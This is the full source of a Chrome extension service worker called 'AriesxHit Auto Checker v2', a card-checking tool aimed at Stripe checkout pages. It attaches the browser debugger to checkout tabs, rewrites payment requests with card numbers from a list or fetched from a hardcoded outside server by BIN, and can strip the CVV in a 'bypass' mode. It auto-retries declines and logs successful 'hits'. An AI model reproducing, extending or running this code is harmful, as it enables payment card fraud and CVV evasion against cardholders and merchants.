// ===================================
// BACKGROUND.JS
// Main Service Worker - Permission Gated
// AriesxHit Auto Checker v2
// ===================================

// ==================== INLINE UTILITIES (Service Worker) ====================
// These utilities are inlined because Service Workers can't import regular scripts

const Formatters = {
  maskCardNumber(cardNumber) {
    const cleaned = String(cardNumber).replace(/\D/g, '');
    if (cleaned.length < 10) return cleaned;
    const first6 = cleaned.substring(0, 6);
    const last4 = cleaned.substring(cleaned.length - 4);
    return first6 + '...' + last4;
  },
  
  formatTime(date = new Date()) {
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    return `${hours}:${minutes}:${seconds}`;
  },
  
  formatResponseCode(code) {
    const responses = {
      'success': 'Success',
      'generic_decline': 'Generic Decline',
      'insufficient_funds': 'Insufficient Funds',
      'card_expired': 'Card Expired',
      'incorrect_cvc': 'Invalid CVV',
      'do_not_honor': 'Do Not Honor',
      'fraudulent': 'Fraudulent',
      'lost_card': 'Lost Card',
      'stolen_card': 'Stolen Card',
      'incorrect_number': 'Invalid Number',
      'processing_error': 'Processing Error'
    };
    return responses[code] || code;
  }
};

// State Management
let state = {
  autoHitActive: false,
  bypassActive: false,
  currentCard: null,
  cardList: [],
  cardIndex: 0,
  bin: null,
  proxy: null,
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  permissions: null,
  userClickedSubmit: false,
  retryInProgress: false
};

// Tab Management
const tabState = new Map(); // tabId -> { cardIndex, currentCard, lastAttempt }
const debuggerTabs = new Set();

// ==================== INITIALIZATION ====================

// Load state from storage on startup
chrome.storage.local.get(['logs', 'stats', 'permissions'], (result) => {
  if (result.logs) state.logs = result.logs;
  if (result.stats) state.stats = result.stats;
  if (result.permissions) state.permissions = result.permissions;
});

// Open popup on icon click
chrome.action.onClicked.addListener(() => {
  chrome.tabs.create({ url: chrome.runtime.getURL('popup.html') });
});

// ==================== PERMISSION CHECKS ====================

async function checkPermission(feature) {
  const permissions = await chrome.storage.local.get('permissions');
  
  if (!permissions || !permissions.permissions) {
    return false;
  }

  return permissions.permissions[feature] === true;
}

// ==================== MESSAGE HANDLING ====================

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  handleMessage(message, sender, sendResponse);
  return true; // Keep channel open for async response
});

async function handleMessage(message, sender, sendResponse) {
  console.log('Message received:', message.type);

  switch (message.type) {
    case 'START_AUTO_HIT':
      await handleStartAutoHit(message.data, sendResponse);
      break;

    case 'STOP_AUTO_HIT':
      handleStopAutoHit(sendResponse);
      break;

    case 'START_BYPASS':
      await handleStartBypass(sendResponse);
      break;

    case 'STOP_BYPASS':
      handleStopBypass(sendResponse);
      break;

    case 'GET_LOGS':
      sendResponse({ logs: state.logs, stats: state.stats });
      break;

    case 'ADD_LOG':
      addLog(message.log);
      sendResponse({ success: true });
      break;

    case 'CLEAR_LOGS':
      clearLogs();
      sendResponse({ success: true });
      break;

    case 'GET_STATS':
      sendResponse(state.stats);
      break;

    case 'GET_AUTO_HIT_STATE':
      sendResponse({ active: state.autoHitActive });
      break;

    case 'GET_BYPASS_STATE':
      sendResponse({ active: state.bypassActive });
      break;

    case 'user_clicked_submit':
      state.userClickedSubmit = true;
      console.log('User clicked submit button');
      sendResponse({ success: true });
      break;

    case 'BYPASS_EVENT':
      // Log bypass event
      if (message.data) {
        addLog({ 
          type: 'success', 
          message: `🔓 CVV Bypass: ${message.data.method} - Count: ${message.data.count}`, 
          timestamp: Date.now() 
        });
      }
      sendResponse({ success: true });
      break;

    case 'STRIPE_RESPONSE':
      // Handle Stripe response from response-interceptor.js
      if (message.result) {
        const result = message.result;
        if (result.success) {
          addLog({ type: 'success', message: `✅ Payment: ${result.message}`, timestamp: Date.now() });
        } else if (result.code) {
          addLog({ type: 'error', message: `❌ ${result.message} (${result.code})`, timestamp: Date.now() });
        }
      }
      sendResponse({ success: true });
      break;

    case 'SUCCESS_PAGE_DETECTED':
      addLog({ type: 'success', message: `🎉 Success page detected: ${message.url}`, timestamp: Date.now() });
      sendResponse({ success: true });
      break;

    default:
      sendResponse({ error: 'Unknown message type' });
  }
}

// ==================== AUTO HIT ====================

async function handleStartAutoHit(data, sendResponse) {
  // Check permission
  const hasPermission = await checkPermission('auto_hit');
  if (!hasPermission) {
    addLog({ type: 'error', message: 'Access Denied: Auto Hit permission required', timestamp: Date.now() });
    sendResponse({ success: false, error: 'NO_PERMISSION' });
    return;
  }

  // Validate data
  if (!data.bin && (!data.cards || data.cards.length === 0)) {
    sendResponse({ success: false, error: 'No BIN or cards provided' });
    return;
  }

  // Set state
  state.autoHitActive = true;
  state.bin = data.bin || null;
  state.cardList = data.cards || [];
  state.cardIndex = 0;
  state.proxy = data.proxy || null;

  addLog({ type: 'success', message: 'Auto Hit started', timestamp: Date.now() });
  sendResponse({ success: true });

  // Broadcast to popup
  broadcastToPopup({ type: 'MODE_UPDATE', mode: 'Auto Hit Active' });
}

function handleStopAutoHit(sendResponse) {
  state.autoHitActive = false;
  state.cardList = [];
  state.cardIndex = 0;

  addLog({ type: 'info', message: 'Auto Hit stopped', timestamp: Date.now() });
  sendResponse({ success: true });

  broadcastToPopup({ type: 'MODE_UPDATE', mode: 'Idle' });
}

// ==================== BYPASS MODE ====================

async function handleStartBypass(sendResponse) {
  // Check permission
  const hasPermission = await checkPermission('bypass');
  if (!hasPermission) {
    addLog({ type: 'error', message: 'Access Denied: Bypass permission required', timestamp: Date.now() });
    sendResponse({ success: false, error: 'NO_PERMISSION' });
    return;
  }

  state.bypassActive = true;
  addLog({ type: 'success', message: 'Bypass mode enabled (CVV removal)', timestamp: Date.now() });
  
  // Send bypass state to all tabs
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      chrome.tabs.sendMessage(tab.id, {
        type: 'SET_BYPASS_STATE',
        active: true
      }).catch(() => {});
    });
  });

  sendResponse({ success: true });
}

function handleStopBypass(sendResponse) {
  state.bypassActive = false;
  addLog({ type: 'info', message: 'Bypass mode disabled', timestamp: Date.now() });
  
  // Send bypass state to all tabs
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      chrome.tabs.sendMessage(tab.id, {
        type: 'SET_BYPASS_STATE',
        active: false
      }).catch(() => {});
    });
  });

  sendResponse({ success: true });
}

// ==================== CARD MANAGEMENT ====================

async function getNextCard(tabId) {
  // If using card list
  if (state.cardList && state.cardList.length > 0) {
    const tabInfo = tabState.get(tabId) || { cardIndex: 0 };
    
    if (tabInfo.cardIndex >= state.cardList.length) {
      return null; // No more cards
    }

    const card = state.cardList[tabInfo.cardIndex];
    tabInfo.cardIndex++;
    tabState.set(tabId, tabInfo);

    return card;
  }

  // If using BIN
  if (state.bin) {
    return await generateCardFromBIN(state.bin);
  }

  return null;
}

async function generateCardFromBIN(bin) {
  try {
    const url = `http://193.203.162.2:1490/check?bin=${encodeURIComponent(bin)}`;
    const response = await fetch(url);
    
    if (!response.ok) {
      return null;
    }

    const cardData = await response.text();
    const [number, month, year, cvv] = cardData.trim().split('|');

    return { number, month, year, cvv };
  } catch (error) {
    console.error('Error generating card:', error);
    return null;
  }
}

// ==================== DEBUGGER HANDLING ====================

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url && (tab.url.includes('cs_live') || tab.url.includes('buy.stripe.com'))) {
    injectContentScripts(tabId);
    
    if (!debuggerTabs.has(tabId)) {
      attachDebugger(tabId);
    }
  }
});

function injectContentScripts(tabId) {
  chrome.scripting.executeScript({
    target: { tabId, allFrames: true },
    files: ['scripts/content/stripe-detector.js', 'scripts/content/form-injector.js']
  }, () => {
    if (chrome.runtime.lastError) {
      console.error('Script injection error:', chrome.runtime.lastError);
    }
  });
}

function attachDebugger(tabId) {
  if (debuggerTabs.has(tabId)) return;

  chrome.debugger.attach({ tabId }, '1.3', () => {
    if (chrome.runtime.lastError) {
      console.error('Debugger attach error:', chrome.runtime.lastError);
      return;
    }

    debuggerTabs.add(tabId);

    chrome.debugger.sendCommand({ tabId }, 'Fetch.enable', { patterns: [{ urlPattern: '*' }] });
    chrome.debugger.sendCommand({ tabId }, 'Network.enable');

    console.log('Debugger attached to tab:', tabId);
  });
}

// ==================== DEBUGGER EVENT LISTENER ====================

chrome.debugger.onEvent.addListener((source, method, params) => {
  if (!source.tabId || !debuggerTabs.has(source.tabId)) return;

  if (method === 'Fetch.requestPaused') {
    handleRequestPaused(source.tabId, params);
  } else if (method === 'Network.responseReceived') {
    handleResponseReceived(source.tabId, params);
  }
});

async function handleRequestPaused(tabId, params) {
  const { requestId, request } = params;
  const url = request.url;
  const method = request.method;

  // Check if Stripe payment_methods request
  if (url.includes('stripe.com/v1/payment_methods') && method === 'POST' && request.postData) {
    // Check if Auto Hit is active
    if (!state.autoHitActive) {
      continueRequest(tabId, requestId);
      return;
    }

    // Get next card
    const card = await getNextCard(tabId);
    if (!card) {
      addLog({ type: 'error', message: 'Card list ended', timestamp: Date.now() });
      continueRequest(tabId, requestId);
      return;
    }

    // Modify request with card data
    let params = new URLSearchParams(request.postData);
    params.set('card[number]', card.number);
    params.set('card[exp_month]', card.month);
    params.set('card[exp_year]', card.year);

    // If Bypass mode is active, don't include CVV
    if (!state.bypassActive) {
      params.set('card[cvc]', card.cvv);
    }

    const modifiedBody = params.toString();
    const bodyBase64 = btoa(unescape(encodeURIComponent(modifiedBody)));

    const headers = [
      { name: 'Content-Type', value: 'application/x-www-form-urlencoded' },
      { name: 'Content-Length', value: modifiedBody.length.toString() }
    ];

    chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', {
      requestId,
      method,
      postData: bodyBase64,
      headers
    });

    // Log attempt
    const masked = Formatters.maskCardNumber(card.number);
    addLog({ type: 'info', message: `Trying: ${masked}|${card.month}|${card.year}|${card.cvv || 'XXX'}`, timestamp: Date.now() });

    // Store current card for tab
    tabState.set(tabId, { ...tabState.get(tabId), currentCard: card });

    // Notify content script
    chrome.tabs.sendMessage(tabId, {
      type: 'show_notification',
      message: `💳 Testing: ${masked}`,
      messageType: 'info'
    });

    return;
  }

  // Continue request normally
  continueRequest(tabId, requestId);
}

function continueRequest(tabId, requestId) {
  chrome.debugger.sendCommand({ tabId }, 'Fetch.continueRequest', { requestId });
}

async function handleResponseReceived(tabId, params) {
  const { requestId, response } = params;
  const url = response.url;

  if (!url.includes('api.stripe.com')) return;

  chrome.debugger.sendCommand({ tabId }, 'Network.getResponseBody', { requestId }, (result) => {
    if (result && result.body) {
      const body = result.base64Encoded ? atob(result.body) : result.body;
      
      try {
        const data = JSON.parse(body);
        processStripeResponse(tabId, data);
      } catch (error) {
        console.error('Error parsing response:', error);
      }
    }
  });
}

function processStripeResponse(tabId, data) {
  const tabInfo = tabState.get(tabId);
  if (!tabInfo || !tabInfo.currentCard) return;

  const card = tabInfo.currentCard;
  const masked = Formatters.maskCardNumber(card.number);

  // Check for errors
  if (data.error) {
    const code = data.error.decline_code || data.error.code || 'unknown';
    const message = data.error.message || 'Declined';

    addLog({ type: 'error', message: `❌ ${masked}: ${code}`, timestamp: Date.now() });
    state.stats.declined++;

    // Retry with next card
    if (state.autoHitActive && state.userClickedSubmit) {
      setTimeout(() => retryWithNextCard(tabId), 2000);
    }

    return;
  }

  // Check for success
  if (data.status && (data.status === 'succeeded' || data.status === 'success')) {
    handleSuccess(tabId, card);
    return;
  }
}

function handleSuccess(tabId, card) {
  const masked = Formatters.maskCardNumber(card.number);
  const cardString = `${card.number}|${card.month}|${card.year}|${card.cvv}`;

  addLog({ type: 'success', message: `✨ HIT: ${masked}`, timestamp: Date.now() });
  state.stats.hits++;

  // Stop Auto Hit
  state.autoHitActive = false;
  state.userClickedSubmit = false;

  // Notify user
  chrome.tabs.sendMessage(tabId, {
    type: 'show_notification',
    message: '🎉 Payment Success!',
    messageType: 'success'
  });

  // Broadcast stats update
  broadcastToPopup({ type: 'STATS_UPDATE', hits: state.stats.hits });
  broadcastToPopup({ type: 'MODE_UPDATE', mode: 'Idle' });

  // Save stats
  chrome.storage.local.set({ stats: state.stats });
}

function retryWithNextCard(tabId) {
  if (state.retryInProgress) return;

  state.retryInProgress = true;

  chrome.tabs.sendMessage(tabId, {
    type: 'trigger_retry',
    selector: '.SubmitButton' // Default Stripe submit selector
  }, () => {
    state.retryInProgress = false;
  });
}

// ==================== LOGGING ====================

function addLog(log) {
  state.logs.push(log);

  // Keep last 500 logs
  if (state.logs.length > 500) {
    state.logs.shift();
  }

  // Save to storage
  chrome.storage.local.set({ logs: state.logs });

  // Broadcast to popup
  broadcastToPopup({
    type: 'LOG_UPDATE',
    logType: log.type,
    message: log.message
  });
}

function clearLogs() {
  state.logs = [];
  chrome.storage.local.set({ logs: [] });
}

// ==================== UTILITIES ====================

function broadcastToPopup(message) {
  chrome.runtime.sendMessage(message, () => {
    if (chrome.runtime.lastError) {
      // Popup not open, ignore
    }
  });
}

// Clean up on tab close
chrome.tabs.onRemoved.addListener((tabId) => {
  if (debuggerTabs.has(tabId)) {
    chrome.debugger.detach({ tabId });
    debuggerTabs.delete(tabId);
  }
  tabState.delete(tabId);
});

console.log('AriesxHit Background Service Worker - Ready');